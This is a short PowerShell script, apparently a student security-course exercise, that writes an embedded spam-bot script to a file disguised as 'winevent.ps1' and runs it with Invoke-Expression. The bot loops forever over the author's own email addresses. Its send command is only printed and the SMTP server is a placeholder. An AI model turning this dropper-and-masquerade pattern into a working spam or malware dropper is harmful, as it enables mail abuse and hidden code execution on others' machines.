<#
    Storyline: Dropper for our spam bot that will save to a directory and then execute it
    To comment multiple lines do <# #>
#>
#Send an email using Powershell

    $writeSbBot = @'
#anything inside of the @''@ will be interperated as standard text

#Print an array of emails
#To print an array you use @() and the elements go inside
$toSend = @('ethan.deane@mymail.champlain.edu', 'ethan.deane1@mymail.champlain.edu', 'ethan.deane2@mymail.champlain.edu')

#message body
$msg = "Hello"

while ($true) {
    #Loops through each email in $toSend and does what is inside the loop each time
    foreach ($email in $toSend) {

        #Send the email
        Write-Host "Send-MailMessage -from 'ethan.deane@mymail.champlain.edu' -to $email -Subject 'Tisk Tisk' -Body $msg SMTPServer X.X.X.X"
        #Send-MailMessage is a built in command to send an email
        #SMTPServer is the relay that you use to send the email
        #-Body is the body of the message
        # -Attackment "path" lets you attach a  document or video if you know the path on your computer
        #The basic structure of writing an email through Powershell

        #Pause for 1 second
        start-sleep 1

    }
}
'@

#Directory to write the bot
$sbDir = 'C:\Users\ethan\Desktop\SYS-320-01 File Dump'

#Create a random number to add to the file
$sbRand = Get-random -Minimum 1000 -Maximum 1999

#Create the file and location to save the bot
#C:\Users\ethan\Desktop\SYS-320-01 File Dump\1045winevent.ps1
$file = $sbDir + $sbRand + "winevent.ps1"

#write to a file
$writeSbBot | Out-File -FilePath $file

#Executes the PowerShell script
Invoke-Expression $file